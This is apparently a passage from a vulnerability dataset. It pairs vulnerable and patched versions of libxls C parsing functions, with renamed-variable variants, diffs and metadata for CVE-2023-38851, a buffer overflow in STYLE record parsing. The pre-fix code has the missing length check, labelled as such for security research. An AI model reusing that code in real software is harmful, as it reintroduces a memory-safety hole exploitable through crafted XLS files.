printf("" family: 0x%x\n"", VAR_28->family);
printf(""charset: 0x%x\n"", VAR_28->charset);
if(VAR_27) printf(""   name: %s\n"", VAR_27);
}
}
break;
case VAR_29:
xlsConvertFormat((FORMAT *)VAR_4);
if ((VAR_6 = xls_addFormat(VAR_0, (FORMAT*)VAR_4, VAR_2.size)) != VAR_7) {
goto cleanup;
}
break;
case VAR_30:
if(VAR_8) {
struct { unsigned short idx; unsigned char ident; unsigned char lvl; } *VAR_31;
VAR_31 = (void *)VAR_4;
printf(""    idx: 0x%x\n"", VAR_31->idx & 0x07FF);
if(VAR_31->idx & 0x8000) {
printf(""  ident: 0x%x\n"", VAR_31->ident);
printf(""  level: 0x%x\n"", VAR_31->lvl);
} else {
char *VAR_27 = get_string((char *)&VAR_4[2], VAR_2.size - 2, 1, VAR_0);
printf(""  name=%s\n"", VAR_27);
free(VAR_27);
}
}
break;
case VAR_32:
if(VAR_8 > 10) {
unsigned char *VAR_33 = VAR_4 + 2;
int VAR_34, VAR_35;
VAR_35 = VAR_4[0] + (VAR_4[1] << 8);
for(VAR_34=0; VAR_34<VAR_35; ++VAR_34) {
printf(""   Index=0x%2.2x %2.2x%2.2x%2.2x\n"", VAR_34+8, VAR_33[0], VAR_33[1], VAR_33[2] );
VAR_33 += 4;
}
}
break;
case VAR_36:
VAR_0->is1904 = *(BYTE *)VAR_4;
if(VAR_8) {
printf(""   mode: 0x%x\n"", VAR_0->is1904);
}
break;
case VAR_37:
VAR_6 = VAR_38;
goto cleanup;
case VAR_39:
if(VAR_8) {
int VAR_40;
printf(""   DEFINEDNAME: "");
for(VAR_40=0; VAR_40<VAR_2.size; ++VAR_40) printf(""%2.2x "", VAR_4[VAR_40]);
printf(""\n"");
}
break;
default:
if(VAR_8)
{
printf(""    Not Processed in parseWorkBook():  BOF=0x%4.4X size=%d\n"", VAR_2.id, VAR_2.size);
}
break;
}
VAR_3=VAR_2;
VAR_5=1;
}
while ((!VAR_0->olestr->eof)&&(VAR_2.id!=VAR_13));
cleanup:
if (VAR_4)
free(VAR_4);
return VAR_6;
}",libxls/c009fa87fc775f8cc63e85d2018223143cb200e6/xls.c/vul/before/1.json,"xls_error_t xls_parseWorkBook(xlsWorkBook* pWB)
{
    if(!pWB) return LIBXLS_ERROR_NULL_ARGUMENT;

    BOF bof1 = { .id = 0, .size = 0 };
    BOF bof2 = { .id = 0, .size = 0 };
    BYTE* buf = NULL;
	BYTE once = 0;
    xls_error_t retval = LIBXLS_OK;

    verbose (""xls_parseWorkBook"");
    do {
		if(xls_debug > 10) {
			printf(""READ WORKBOOK filePos=%ld\n"",  (long)pWB->filepos);
			printf(""  OLE: start=%d pos=%u size=%u fatPos=%u\n"",
                    pWB->olestr->start, (unsigned int)pWB->olestr->pos,
                    (unsigned int)pWB->olestr->size, (unsigned int)pWB->olestr->fatpos); 
		}

        if (ole2_read(&bof1, 1, 4, pWB->olestr) != 4) {
            retval = LIBXLS_ERROR_READ;
            goto cleanup;
        }
        xlsConvertBof(&bof1);
 		if(xls_debug) xls_showBOF(&bof1);

        if (bof1.size) {
            if ((buf = realloc(buf, bof1.size)) == NULL) {
                if (xls_debug) fprintf(stderr, ""Error: failed to allocate buffer of size %d\n"", (int)bof1.size);
                retval = LIBXLS_ERROR_MALLOC;
                goto cleanup;
            }
            if (ole2_read(buf, 1, bof1.size, pWB->olestr) != bof1.size) {
                if (xls_debug) fprintf(stderr, ""Error: failed to read OLE block\n"");
                retval = LIBXLS_ERROR_READ;
                goto  cleanup;
            }
        }

        if (xls_isRecordTooSmall(pWB, &bof1, buf)) {
            retval = LIBXLS_ERROR_PARSE;
            goto cleanup;
        }

        switch (bof1.id) {
        case XLS_RECORD_EOF:
            //verbose(""EOF"");
            break;
        case XLS_RECORD_BOF:	// BIFF5-8
            pWB->is5ver = (buf[0] + (buf[1] << 8) != 0x600);
            pWB->type = buf[2] + (buf[3] << 8);
            if(xls_debug) {
                printf(""version: %s\n"", pWB->is5ver ? ""BIFF5"" : ""BIFF8"" );
                printf(""   type: %.2X\n"", pWB->type);
            }
            break;

        case XLS_RECORD_CODEPAGE:
            pWB->codepage = buf[0] + (buf[1] << 8);
			if(xls_debug) printf(""codepage: %d\n"", pWB->codepage);
            break;

        case XLS_RECORD_CONTINUE:
			if(once) {
				if (bof2.id==XLS_RECORD_SST) {
					if ((retval = xls_appendSST(pWB,buf,bof1.size)) != LIBXLS_OK)
                        goto cleanup;
                }
				bof1=bof2;
			}
            break;

		case XLS_RECORD_WINDOW1:
			{
				WIND1 *w = (WIND1*)buf;
                xlsConvertWindow(w);
				pWB->activeSheetIdx = w->itabCur;
				if(xls_debug) {
					printf(""WINDOW1: "");
					printf(""xWn    : %d\n"", w->xWn/20);
					printf(""yWn    : %d\n"", w->yWn/20);
					printf(""dxWn   : %d\n"", w->dxWn/20);
					printf(""dyWn   : %d\n"", w->dyWn/20);
					printf(""grbit  : %d\n"", w->grbit);
					printf(""itabCur: %d\n"", w->itabCur);
					printf(""itabFi : %d\n"", w->itabFirst);
					printf(""ctabSel: %d\n"", w->ctabSel);
					printf(""wTabRat: %d\n"", w->wTabRatio);
				}
			}
			break;

        case XLS_RECORD_SST:
			//printf(""ADD SST\n"");
            xlsConvertSst((SST *)buf);
            if ((retval = xls_addSST(pWB,(SST*)buf,bof1.size)) != LIBXLS_OK) {
                goto cleanup;
            }
            break;

        case XLS_RECORD_EXTSST:
            break;

        case XLS_RECORD_BOUNDSHEET:
			{
				//printf(""ADD SHEET\n"");
				BOUNDSHEET *bs = (BOUNDSHEET *)buf;
                xlsConvertBoundsheet(bs);
				// different for BIFF5 and BIFF8
                if ((retval = xls_addSheet(pWB, bs, bof1.size)) != LIBXLS_OK) {
                    goto cleanup;
                }
			}
            break;

        case XLS_RECORD_XF:
			if(pWB->is5ver) {
				XF5 *xf;
				xf = (XF5 *)buf;
                xlsConvertXf5(xf);

				if ((retval = xls_addXF5(pWB,xf)) != LIBXLS_OK) {
                    goto cleanup;
                }
				if(xls_debug) {
					printf(""   font: %d\n"", xf->font);
					printf("" format: %d\n"", xf->format);
					printf(""   type: %.4x\n"", xf->type);
					printf(""  align: %.4x\n"", xf->align);
					printf(""rotatio: %.4x\n"", xf->color);
					printf(""  ident: %.4x\n"", xf->fill);
					printf(""usedatt: %.4x\n"", xf->border);
					printf(""linesty: %.4x\n"", xf->linestyle);
				}
			} else {
				XF8 *xf;
				xf = (XF8 *)buf;
                xlsConvertXf8(xf);

				if ((retval = xls_addXF8(pWB,xf)) != LIBXLS_OK) {
                    goto cleanup;
                }

				if(xls_debug) {
					xls_showXF(xf);
				}
			}
            break;

        case XLS_RECORD_FONT:
        case XLS_RECORD_FONT_ALT:
			{
				char *s;
				FONT *f = (FONT*)buf;
                xlsConvertFont(f);
				s = xls_addFont(pWB,f, bof1.size);
				if(xls_debug) {
					printf("" height: %d\n"", f->height);
					printf(""   flag: 0x%x\n"", f->flag);
					printf(""  color: 0x%x\n"", f->color);
					printf("" weight: %d\n"", f->bold);
					printf(""escapem: 0x%x\n"", f->escapement);
					printf(""underln: 0x%x\n"", f->underline);
					printf("" family: 0x%x\n"", f->family);
					printf(""charset: 0x%x\n"", f->charset);
					if(s) printf(""   name: %s\n"", s);
				}
			}
			break;

        case XLS_RECORD_FORMAT:
            xlsConvertFormat((FORMAT *)buf);
            if ((retval = xls_addFormat(pWB, (FORMAT*)buf, bof1.size)) != LIBXLS_OK) {
                goto cleanup;
            }
            break;

		case XLS_RECORD_STYLE:
			if(xls_debug) {
				struct { unsigned short idx; unsigned char ident; unsigned char lvl; } *styl;
				styl = (void *)buf;

				printf(""    idx: 0x%x\n"", styl->idx & 0x07FF);
				if(styl->idx & 0x8000) {
					printf(""  ident: 0x%x\n"", styl->ident);
					printf(""  level: 0x%x\n"", styl->lvl);
				} else {
					char *s = get_string((char *)&buf[2], bof1.size - 2, 1, pWB);
					printf(""  name=%s\n"", s);
                    free(s);
				}
			}
			break;

        case XLS_RECORD_PALETTE:
			if(xls_debug > 10) {
				unsigned char *p = buf + 2;
				int idx, len;

				len = buf[0] + (buf[1] << 8);
				for(idx=0; idx<len; ++idx) {
					printf(""   Index=0x%2.2x %2.2x%2.2x%2.2x\n"", idx+8, p[0], p[1], p[2] );
					p += 4;
				}
			}
			break;

		case XLS_RECORD_1904:
			pWB->is1904 = *(BYTE *)buf;	// the field is a short, but with little endian the first byte is 0 or 1
			if(xls_debug) {
				printf(""   mode: 0x%x\n"", pWB->is1904);
			}
			break;

		case XLS_RECORD_FILEPASS:
			retval = LIBXLS_ERROR_UNSUPPORTED_ENCRYPTION;
			goto cleanup;
		
		case XLS_RECORD_DEFINEDNAME:
			if(xls_debug) {
				int i;
                printf(""   DEFINEDNAME: "");
				for(i=0; i<bof1.size; ++i) printf(""%2.2x "", buf[i]);
				printf(""\n"");
			}
			break;
			
        default:
			if(xls_debug)
			{
				//xls_showBOF(&bof1);
				printf(""    Not Processed in parseWorkBook():  BOF=0x%4.4X size=%d\n"", bof1.id, bof1.size);
			}
            break;
        }
        bof2=bof1;
		once=1;
    }
    while ((!pWB->olestr->eof)&&(bof1.id!=XLS_RECORD_EOF));

cleanup:
    if (buf)
        free(buf);

    return retval;
}","xls_error_t xls_parseWorkBook(xlsWorkBook* VAR_0)
{
    if(!VAR_0) return VAR_1;

    BOF VAR_2 = { .id = 0, .size = 0 };
    BOF VAR_3 = { .id = 0, .size = 0 };
    BYTE* VAR_4 = NULL;
	BYTE VAR_5 = 0;
    xls_error_t VAR_6 = VAR_7;

    verbose (""xls_parseWorkBook"");
    do {
		if(VAR_8 > 10) {
			printf(""READ WORKBOOK filePos=%ld\n"",  (long)VAR_0->filepos);
			printf(""  OLE: start=%d pos=%u size=%u fatPos=%u\n"",
                    VAR_0->olestr->start, (unsigned int)VAR_0->olestr->pos,
                    (unsigned int)VAR_0->olestr->size, (unsigned int)VAR_0->olestr->fatpos); 
		}

        if (ole2_read(&VAR_2, 1, 4, VAR_0->olestr) != 4) {
            VAR_6 = VAR_9;
            goto cleanup;
        }
        xlsConvertBof(&VAR_2);
 		if(VAR_8) xls_showBOF(&VAR_2);

        if (VAR_2.size) {
            if ((VAR_4 = realloc(VAR_4, VAR_2.size)) == NULL) {
                if (VAR_8) fprintf(VAR_10, ""Error: failed to allocate buffer of size %d\n"", (int)VAR_2.size);
                VAR_6 = VAR_11;
                goto cleanup;
            }
            if (ole2_read(VAR_4, 1, VAR_2.size, VAR_0->olestr) != VAR_2.size) {
                if (VAR_8) fprintf(VAR_10, ""Error: failed to read OLE block\n"");
                VAR_6 = VAR_9;
                goto  cleanup;
            }
        }

        if (xls_isRecordTooSmall(VAR_0, &VAR_2, VAR_4)) {
            VAR_6 = VAR_12;
            goto cleanup;
        }

        switch (VAR_2.id) {
        case VAR_13:
            /* COMMENT_0 */
            break;
        case VAR_14:	/* COMMENT_1 */
            VAR_0->is5ver = (VAR_4[0] + (VAR_4[1] << 8) != 0x600);
            VAR_0->type = VAR_4[2] + (VAR_4[3] << 8);
            if(VAR_8) {
                printf(""version: %s\n"", VAR_0->is5ver ? ""BIFF5"" : ""BIFF8"" );
                printf(""   type: %.2X\n"", VAR_0->type);
            }
            break;

        case VAR_15:
            VAR_0->codepage = VAR_4[0] + (VAR_4[1] << 8);
			if(VAR_8) printf(""codepage: %d\n"", VAR_0->codepage);
            break;

        case VAR_16:
			if(VAR_5) {
				if (VAR_3.id==VAR_17) {
					if ((VAR_6 = xls_appendSST(VAR_0,VAR_4,VAR_2.size)) != VAR_7)
                        goto cleanup;
                }
				VAR_2=VAR_3;
			}
            break;

		case VAR_18:
			{
				WIND1 *VAR_19 = (WIND1*)VAR_4;
                xlsConvertWindow(VAR_19);
				VAR_0->activeSheetIdx = VAR_19->itabCur;
				if(VAR_8) {
					printf(""WINDOW1: "");
					printf(""xWn    : %d\n"", VAR_19->xWn/20);
					printf(""yWn    : %d\n"", VAR_19->yWn/20);
					printf(""dxWn   : %d\n"", VAR_19->dxWn/20);
					printf(""dyWn   : %d\n"", VAR_19->dyWn/20);
					printf(""grbit  : %d\n"", VAR_19->grbit);
					printf(""itabCur: %d\n"", VAR_19->itabCur);
					printf(""itabFi : %d\n"", VAR_19->itabFirst);
					printf(""ctabSel: %d\n"", VAR_19->ctabSel);
					printf(""wTabRat: %d\n"", VAR_19->wTabRatio);
				}
			}
			break;

        case VAR_17:
			/* COMMENT_2 */
            xlsConvertSst((SST *)VAR_4);
            if ((VAR_6 = xls_addSST(VAR_0,(SST*)VAR_4,VAR_2.size)) != VAR_7) {
                goto cleanup;
            }
            break;

        case VAR_20:
            break;

        case VAR_21:
			{
				/* COMMENT_3 */
				BOUNDSHEET *VAR_22 = (BOUNDSHEET *)VAR_4;
                xlsConvertBoundsheet(VAR_22);
				/* COMMENT_4 */
                if ((VAR_6 = xls_addSheet(VAR_0, VAR_22, VAR_2.size)) != VAR_7) {
                    goto cleanup;
                }
			}
            break;

        case VAR_23:
			if(VAR_0->is5ver) {
				XF5 *VAR_24;
				VAR_24 = (XF5 *)VAR_4;
                xlsConvertXf5(VAR_24);

				if ((VAR_6 = xls_addXF5(VAR_0,VAR_24)) != VAR_7) {
                    goto cleanup;
                }
				if(VAR_8) {
					printf(""   font: %d\n"", VAR_24->font);
					printf("" format: %d\n"", VAR_24->format);
					printf(""   type: %.4x\n"", VAR_24->type);
					printf(""  align: %.4x\n"", VAR_24->align);
					printf(""rotatio: %.4x\n"", VAR_24->color);
					printf(""  ident: %.4x\n"", VAR_24->fill);
					printf(""usedatt: %.4x\n"", VAR_24->border);
					printf(""linesty: %.4x\n"", VAR_24->linestyle);
				}
			} else {
				XF8 *VAR_24;
				VAR_24 = (XF8 *)VAR_4;
                xlsConvertXf8(VAR_24);

				if ((VAR_6 = xls_addXF8(VAR_0,VAR_24)) != VAR_7) {
                    goto cleanup;
                }

				if(VAR_8) {
					xls_showXF(VAR_24);
				}
			}
            break;

        case VAR_25:
        case VAR_26:
			{
				char *VAR_27;
				FONT *VAR_28 = (FONT*)VAR_4;
                xlsConvertFont(VAR_28);
				VAR_27 = xls_addFont(VAR_0,VAR_28, VAR_2.size);
				if(VAR_8) {
					printf("" height: %d\n"", VAR_28->height);
					printf(""   flag: 0x%x\n"", VAR_28->flag);
					printf(""  color: 0x%x\n"", VAR_28->color);
					printf("" weight: %d\n"", VAR_28->bold);
					printf(""escapem: 0x%x\n"", VAR_28->escapement);
					printf(""underln: 0x%x\n"", VAR_28->underline);
					printf("" family: 0x%x\n"", VAR_28->family);
					printf(""charset: 0x%x\n"", VAR_28->charset);
					if(VAR_27) printf(""   name: %s\n"", VAR_27);
				}
			}
			break;

        case VAR_29:
            xlsConvertFormat((FORMAT *)VAR_4);
            if ((VAR_6 = xls_addFormat(VAR_0, (FORMAT*)VAR_4, VAR_2.size)) != VAR_7) {
                goto cleanup;
            }
            break;

		case VAR_30:
			if(VAR_8) {
				struct { unsigned short idx; unsigned char ident; unsigned char lvl; } *VAR_31;
				VAR_31 = (void *)VAR_4;

				printf(""    idx: 0x%x\n"", VAR_31->idx & 0x07FF);
				if(VAR_31->idx & 0x8000) {
					printf(""  ident: 0x%x\n"", VAR_31->ident);
					printf(""  level: 0x%x\n"", VAR_31->lvl);
				} else {
					char *VAR_27 = get_string((char *)&VAR_4[2], VAR_2.size - 2, 1, VAR_0);
					printf(""  name=%s\n"", VAR_27);
                    free(VAR_27);
				}
			}
			break;

        case VAR_32:
			if(VAR_8 > 10) {
				unsigned char *VAR_33 = VAR_4 + 2;
				int VAR_34, VAR_35;

				VAR_35 = VAR_4[0] + (VAR_4[1] << 8);
				for(VAR_34=0; VAR_34<VAR_35; ++VAR_34) {
					printf(""   Index=0x%2.2x %2.2x%2.2x%2.2x\n"", VAR_34+8, VAR_33[0], VAR_33[1], VAR_33[2] );
					VAR_33 += 4;
				}
			}
			break;

		case VAR_36:
			VAR_0->is1904 = *(BYTE *)VAR_4;	/* COMMENT_5 */
			if(VAR_8) {
				printf(""   mode: 0x%x\n"", VAR_0->is1904);
			}
			break;

		case VAR_37:
			VAR_6 = VAR_38;
			goto cleanup;
		
		case VAR_39:
			if(VAR_8) {
				int VAR_40;
                printf(""   DEFINEDNAME: "");
				for(VAR_40=0; VAR_40<VAR_2.size; ++VAR_40) printf(""%2.2x "", VAR_4[VAR_40]);
				printf(""\n"");
			}
			break;
			
        default:
			if(VAR_8)
			{
				/* COMMENT_6 */
				printf(""    Not Processed in parseWorkBook():  BOF=0x%4.4X size=%d\n"", VAR_2.id, VAR_2.size);
			}
            break;
        }
        VAR_3=VAR_2;
		VAR_5=1;
    }
    while ((!VAR_0->olestr->eof)&&(VAR_2.id!=VAR_13));

cleanup:
    if (VAR_4)
        free(VAR_4);

    return VAR_6;
}",libxls/c009fa87fc775f8cc63e85d2018223143cb200e6/xls.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -37,7 +37,7 @@
             }
         }
 
-        if (xls_isRecordTooSmall(pWB, &bof1)) {
+        if (xls_isRecordTooSmall(pWB, &bof1, buf)) {
             retval = LIBXLS_ERROR_PARSE;
             goto cleanup;
         }","{'deleted_lines': ['        if (xls_isRecordTooSmall(pWB, &bof1)) {'], 'added_lines': ['        if (xls_isRecordTooSmall(pWB, &bof1, buf)) {']}",True,Buffer Overflow vulnerability in libxlsv.1.6.2 allows a remote attacker to execute arbitrary code and cause a denial of service via a crafted XLS file to the xls_parseWorkBook function in xls.c:1018.,6.5,MEDIUM,1,valid,2024-02-03T22:59:02Z,4
CVE-2023-38851,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,libxls,"Fix buffer overflows when parsing style records

Closes #124, #126.

According to https://download.microsoft.com/download/5/0/1/501ED102-E53F-4CE0-AA6B-B0F93629DDC6/Office/Excel97-2007BinaryFileFormat(xls)Specification.pdf
a ""STYLE: Style Information (293h)"" record might be 4 or 3+ bytes
long, depending on the first word.

We need to check that we've read enough bytes for the whole
record, so
- first we check that we have a word at least,
- then we check the subtype of the record.
- If it is a built-in style, then it has 4 bytes, so we check that.
- Otherwise the length of the name is in byte 3, so the whole record
  is 3 + buf[3] bytes long. So we need at least three bytes before we
  check the length in byte 3. Then we check if we have 3 + buf[3]
  bytes.",c009fa87fc775f8cc63e85d2018223143cb200e6,https://github.com/libxls/libxls/commit/c009fa87fc775f8cc63e85d2018223143cb200e6,src/xls.c,xls_isRecordTooSmall,"int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1) {
switch (bof1->id) {
case XLS_RECORD_BOF:            return (bof1->size < 2 * sizeof(WORD));
case XLS_RECORD_CODEPAGE:
return (bof1->size < sizeof(WORD));
case XLS_RECORD_WINDOW1:
return (bof1->size < sizeof(WIND1));
case XLS_RECORD_SST:
return (bof1->size < offsetof(SST, strings));
case XLS_RECORD_BOUNDSHEET:
return (bof1->size < offsetof(BOUNDSHEET, name));
case XLS_RECORD_XF:
if(pWB->is5ver) {
return (bof1->size < sizeof(XF5));
}
return (bof1->size < sizeof(XF8));
case XLS_RECORD_FONT:
case XLS_RECORD_FONT_ALT:
return (bof1->size < offsetof(FONT, name));
case XLS_RECORD_FORMAT:
return (bof1->size < offsetof(FORMAT, value));
case XLS_RECORD_1904:
return (bof1->size < sizeof(BYTE));
default:
break;
}
return 0;
}","int xls_isRecordTooSmall(xlsWorkBook *VAR_0, BOF *VAR_1) {
switch (VAR_1->id) {
case VAR_2:
return (VAR_1->size < 2 * sizeof(VAR_3));
case VAR_4:
return (VAR_1->size < sizeof(VAR_3));
case VAR_5:
return (VAR_1->size < sizeof(VAR_6));
case VAR_7:
return (VAR_1->size < offsetof(VAR_8, VAR_9));
case VAR_10:
return (VAR_1->size < offsetof(VAR_11, VAR_12));
case VAR_13:
if(VAR_0->is5ver) {
return (VAR_1->size < sizeof(VAR_14));
}
return (VAR_1->size < sizeof(VAR_15));
case VAR_16:
case VAR_17:
return (VAR_1->size < offsetof(VAR_18, VAR_12));
case VAR_19:
return (VAR_1->size < offsetof(VAR_20, VAR_21));
case VAR_22:
return (VAR_1->size < sizeof(VAR_23));
default:
break;
}
return 0;
}",libxls/c009fa87fc775f8cc63e85d2018223143cb200e6/xls.c/vul/before/0.json,"int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1, const BYTE* buf) {
    switch (bof1->id) {
        case XLS_RECORD_BOF:	// BIFF5-8
            return (bof1->size < 2 * sizeof(WORD));
        case XLS_RECORD_CODEPAGE:
            return (bof1->size < sizeof(WORD));
		case XLS_RECORD_WINDOW1:
            return (bof1->size < sizeof(WIND1));
        case XLS_RECORD_SST:
            return (bof1->size < offsetof(SST, strings));
        case XLS_RECORD_BOUNDSHEET:
            return (bof1->size < offsetof(BOUNDSHEET, name));
        case XLS_RECORD_XF:
			if(pWB->is5ver) {
                return (bof1->size < sizeof(XF5));
            }
            return (bof1->size < sizeof(XF8));
        case XLS_RECORD_FONT:
        case XLS_RECORD_FONT_ALT:
            return (bof1->size < offsetof(FONT, name));
        case XLS_RECORD_FORMAT:
            return (bof1->size < offsetof(FORMAT, value));
        case XLS_RECORD_STYLE:
            {
                struct {
                    unsigned short idx;
                    unsigned char ident;
                    unsigned char lvl;
                } *styl;
                styl = (void *)buf;
                if(bof1->size < 2) {
                    return 1;
                }
                if(styl->idx & 0x8000) {
                    return bof1->size < 4;
                } else {
                    if(bof1->size < 3) return 1;
                    return bof1->size < 3 + styl->ident;
                }
            }
		case XLS_RECORD_1904:
            return (bof1->size < sizeof(BYTE));
        default:
            break;
    }
    return 0;
}","int xls_isRecordTooSmall(xlsWorkBook *VAR_0, BOF *VAR_1, const BYTE* VAR_2) {
    switch (VAR_1->id) {
        case VAR_3:	/* COMMENT_0 */
            return (VAR_1->size < 2 * sizeof(VAR_4));
        case VAR_5:
            return (VAR_1->size < sizeof(VAR_4));
		case VAR_6:
            return (VAR_1->size < sizeof(VAR_7));
        case VAR_8:
            return (VAR_1->size < offsetof(VAR_9, VAR_10));
        case VAR_11:
            return (VAR_1->size < offsetof(VAR_12, VAR_13));
        case VAR_14:
			if(VAR_0->is5ver) {
                return (VAR_1->size < sizeof(VAR_15));
            }
            return (VAR_1->size < sizeof(VAR_16));
        case VAR_17:
        case VAR_18:
            return (VAR_1->size < offsetof(VAR_19, VAR_13));
        case VAR_20:
            return (VAR_1->size < offsetof(VAR_21, VAR_22));
        case VAR_23:
            {
                struct {
                    unsigned short idx;
                    unsigned char ident;
                    unsigned char lvl;
                } *VAR_24;
                VAR_24 = (void *)VAR_2;
                if(VAR_1->size < 2) {
                    return 1;
                }
                if(VAR_24->idx & 0x8000) {
                    return VAR_1->size < 4;
                } else {
                    if(VAR_1->size < 3) return 1;
                    return VAR_1->size < 3 + VAR_24->ident;
                }
            }
		case VAR_25:
            return (VAR_1->size < sizeof(BYTE));
        default:
            break;
    }
    return 0;
}",libxls/c009fa87fc775f8cc63e85d2018223143cb200e6/xls.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,4 +1,4 @@
-int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1) {
+int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1, const BYTE* buf) {
     switch (bof1->id) {
         case XLS_RECORD_BOF:	// BIFF5-8
             return (bof1->size < 2 * sizeof(WORD));
@@ -20,6 +20,24 @@
             return (bof1->size < offsetof(FONT, name));
         case XLS_RECORD_FORMAT:
             return (bof1->size < offsetof(FORMAT, value));
+        case XLS_RECORD_STYLE:
+            {
+                struct {
+                    unsigned short idx;
+                    unsigned char ident;
+                    unsigned char lvl;
+                } *styl;
+                styl = (void *)buf;
+                if(bof1->size < 2) {
+                    return 1;
+                }
+                if(styl->idx & 0x8000) {
+                    return bof1->size < 4;
+                } else {
+                    if(bof1->size < 3) return 1;
+                    return bof1->size < 3 + styl->ident;
+                }
+            }
 		case XLS_RECORD_1904:
             return (bof1->size < sizeof(BYTE));
         default:","{'deleted_lines': ['int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1) {'], 'added_lines': ['int xls_isRecordTooSmall(xlsWorkBook *pWB, BOF *bof1, const BYTE* buf) {', '        case XLS_RECORD_STYLE:', '            {', '                struct {', '                    unsigned short idx;', '                    unsigned char ident;', '                    unsigned char lvl;', '                } *styl;', '                styl = (void *)buf;', '                if(bof1->size < 2) {', '                    return 1;', '                }', '                if(styl->idx & 0x8000) {', '                    return bof1->size < 4;', '                } else {', '                    if(bof1->size < 3) return 1;', '                    return bof1->size < 3 + styl->ident;', '                }', '            }']}",True,Buffer Overflow vulnerability in libxlsv.1.6.2 allows a remote attacker to execute arbitrary code and cause a denial of service via a crafted XLS file to the xls_parseWorkBook function in xls.c:1018.,6.5,MEDIUM,1,valid,2024-02-03T22:59:02Z,4
